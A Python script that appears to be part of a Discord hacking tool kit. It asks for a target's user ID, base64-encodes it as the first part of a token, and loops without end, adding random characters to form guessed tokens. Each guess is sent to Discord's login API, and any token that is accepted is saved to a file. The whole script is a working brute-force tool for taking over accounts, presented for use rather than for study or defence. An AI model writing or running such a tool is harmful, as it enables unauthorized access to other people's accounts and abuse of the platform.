from assets import *

r = Fore.RESET
c = Fore.RED
g = Fore.LIGHTBLACK_EX

banner = f"""
                 
                                \033[31m _____ _____ _____ _____ _____ _____ _____ 
                                |     |   __| __  |     |  |  | __  |   __|
                                | | | |   __|    -|   --|  |  |    -|   __|
                                \033[90m|_|_|_|_____|__|__|_____|_____|__|__|_____|
"""

user_id = input(f"                                {datetime.datetime.now().strftime(f'{c}[{g}%H:%M:%S{c}]')}{r} {c}[{r}?{c}]{r} {c}[User Id] {c}> {c}")
user_id_base64 = base64.b64encode(user_id.encode()).decode('utf-8')
os.system('cls'); print (banner)

while True:
    middle_part = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    end_part = ''.join(random.choices(string.ascii_letters + string.digits, k=27))
    
    token = f"{user_id_base64}.{middle_part}.{end_part}"
    headers = {
        'Authorization': token
    }
    
    login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
    
    try:
        if login.status_code == 200:
            print(f"               {datetime.datetime.now().strftime(f'{c}[{g}%H:%M:%S{c}]')}{r} {c}[{r}#{c}]{r} {c}[Valid] {c}>{r} {g}{token}{g}")
            with open('assets/output/token_brute.txt', "a+") as f:
                f.write(f'{token}\n')
        else:
            print(f"               {datetime.datetime.now().strftime(f'{c}[{g}%H:%M:%S{c}]')}{r} {c}[{r}#{c}]{r} {c}[Invalid] {c}>{r} {g}{token}{g}")
    except Exception as e:
        print(f"An error occurred: {e}")